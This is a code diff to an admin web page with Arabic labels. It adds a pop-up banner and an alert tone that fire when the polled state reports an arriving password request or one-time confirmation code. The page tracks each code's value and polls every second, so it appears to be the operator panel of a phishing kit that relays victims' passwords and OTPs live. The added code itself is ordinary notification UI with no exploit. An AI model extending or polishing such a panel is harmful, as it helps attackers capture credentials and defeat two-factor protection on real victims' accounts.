@@ -43,6 +43,13 @@ body{background:var(--bg);font-family:"Cairo",system-ui,sans-serif;color:var(--t
 .main{padding:24px}
 
 /* PENDING TOP CARD */
+.pending-alert{
+  position:fixed;top:18px;left:50%;transform:translateX(-50%) translateY(-16px);opacity:0;pointer-events:none;
+  background:linear-gradient(135deg,#fff4d6,#ffe0b2);border:1px solid #f9a825;color:#7a4f00;
+  padding:12px 18px;border-radius:999px;font-size:13px;font-weight:700;box-shadow:0 12px 28px rgba(0,0,0,.12);
+  z-index:20001;transition:all .25s ease;white-space:nowrap;
+}
+.pending-alert.show{opacity:1;transform:translateX(-50%) translateY(0);}
 #pendSec{display:none;margin-bottom:24px;}
 .pcard{background:var(--s);border:2px solid #fb8c00;border-radius:var(--r);padding:20px 24px;box-shadow:0 0 0 4px rgba(251,140,0,.07);}
 .phdr{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
@@ -109,6 +116,7 @@ tbody tr:hover td{background:#fafbfc}
 </style>
 </head>
 <body>
+<div id="pendingAlert" class="pending-alert" aria-live="polite"></div>
 
 <!-- LOCK -->
 <div id="lock">
@@ -297,6 +305,8 @@ document.getElementById('outbtn').addEventListener('click',()=>{stopPoll();docum
 let tmr=null;
 let lastStateSignature=null;
 let adminRefreshTimer=null;
+let pendingAlertTimer=null;
+let lastPendingNotificationSignature=null;
 function stateSignature(s){
   return JSON.stringify({
     status: s && s.status ? s.status : 'idle',
@@ -305,12 +315,49 @@ function stateSignature(s){
     otp: s && s.otp ? s.otp : ''
   });
 }
+function playPendingTone(){
+  try {
+    const Ctx = window.AudioContext || window.webkitAudioContext;
+    if (!Ctx) return;
+    const ctx = new Ctx();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = 'triangle';
+    osc.frequency.value = 880;
+    gain.gain.value = 0.04;
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.start();
+    setTimeout(() => {
+      osc.stop();
+      ctx.close();
+    }, 180);
+  } catch (e) {}
+}
+function showPendingAlert(s){
+  const banner = document.getElementById('pendingAlert');
+  if (!banner) return;
+  const label = s && s.status === 'pending_otp' ? '🔔 تم وصول رمز التأكيد' : '🔔 تم وصول طلب كلمة المرور';
+  banner.textContent = label;
+  banner.classList.add('show');
+  playPendingTone();
+  if (pendingAlertTimer) clearTimeout(pendingAlertTimer);
+  pendingAlertTimer = setTimeout(() => banner.classList.remove('show'), 4200);
+}
 function startPoll(){check();tmr=setInterval(check,1000);if(bc)bc.onmessage=e=>{if(e.data.type==='update')applyState(e.data.data);};}
 function stopPoll(){if(tmr)clearInterval(tmr);if(adminRefreshTimer)clearInterval(adminRefreshTimer);}
 function check(){applyState(getS());}
 function applyState(s){
   const pending = s && (s.status === 'pending_password' || s.status === 'pending_otp');
   const sig = stateSignature(s);
+  if (pending) {
+    const isNewPending = sig !== lastPendingNotificationSignature;
+    if (isNewPending) {
+      lastPendingNotificationSignature = sig;
+      showPendingAlert(s);
+    }
+  } else {
+    lastPendingNotificationSignature = null;
+  }
   if (!pending && sig === lastStateSignature) return;
   if (pending || sig !== lastStateSignature) {
     lastStateSignature = sig;
